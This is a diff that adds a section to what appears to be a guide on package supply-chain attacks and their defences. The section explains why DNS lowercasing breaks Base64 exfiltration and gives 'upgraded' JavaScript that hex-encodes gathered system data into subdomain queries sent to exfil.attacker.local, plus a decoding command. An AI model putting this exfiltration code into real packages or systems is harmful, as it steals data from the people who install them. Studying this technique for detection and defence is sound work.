@@ -264,6 +264,40 @@ When network security teams monitor system traffic, they heavily inspect outboun
 
 ---
 
+#### The Case-Insensitivity Hurdle (Deep Protocol Analysis)
+
+During live traffic sniffing (e.g., using `tcpdump -i any port 53 -n -A`), you will notice a fascinating protocol behavior:
+- All outbound DNS subdomains captured on the wire appear in **completely lowercase characters** (e.g., `0-eyjoijoia...` instead of `0-eyJoIjoia...`).
+- According to DNS standards, domain routing is strictly **case-insensitive**. Operating system network stacks and recursive resolvers automatically downcase all queries before transmitting them.
+
+##### Why Base64 Fails on the Wire:
+Because standard Base64 is case-sensitive (where `A` and `a` represent completely different binary values), this automatic downcasing corrupts the payload. Attempting to copy a sniffed subdomain query and decode it via `base64 -d` will fail with a `base64: invalid input` error or output binary garbage.
+
+##### How Real-World APTs Solve This:
+To make DNS exfiltration robust and immune to network-level downcasing, real-world malware and covert communication frameworks avoid Base64. Instead, they implement case-insensitive encoding schemes:
+1. **Hexadecimal (Base16):** Uses only digits `0-9` and letters `a-f`.
+2. **Base32:** Uses only the characters `A-Z` and numbers `2-7`.
+
+##### Upgraded Case-Insensitive Payload Code:
+You can adapt `payload-dns.js` to use Hexadecimal encoding to ensure perfect, lossless transmission:
+
+```javascript
+// Encode the gathered metadata as a case-insensitive Hex string
+const encoded = Buffer.from(JSON.stringify(systemData)).toString("hex");
+
+// Split into safe chunks and query
+const chunks = encoded.match(/.{1,50}/g) || [];
+chunks.forEach((chunk, i) => {
+  const subdomain = `${i}-${chunk}.exfil.attacker.local`;
+  dns.resolveTxt(subdomain, () => {});
+});
+```
+
+To decode a Hex query sniffed on the wire, use the following command:
+```bash
+echo "7b2268223a226b616c69222c2275223a226b616c69227d" | xxd -r -p
+```
+
 ### 2. Registry-Level Quarantine (Defense-in-Depth)
 
 While scoped packages and registry pinning protect individual applications on developer workstations, a registry-level defense protects the entire organization. It acts as an upstream gatekeeper, filtering third-party packages before they can ever be cached or served to build systems.
